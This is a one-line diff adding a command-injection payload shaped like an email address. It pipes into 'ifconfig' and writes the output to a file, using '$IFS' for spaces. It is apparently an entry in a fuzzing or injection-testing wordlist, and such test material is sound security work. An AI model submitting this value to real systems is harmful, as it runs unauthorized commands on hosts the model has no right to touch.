@@ -1,0 +1,1 @@
+a|ifconfig|tee$IFS$*output.txt|@a.com
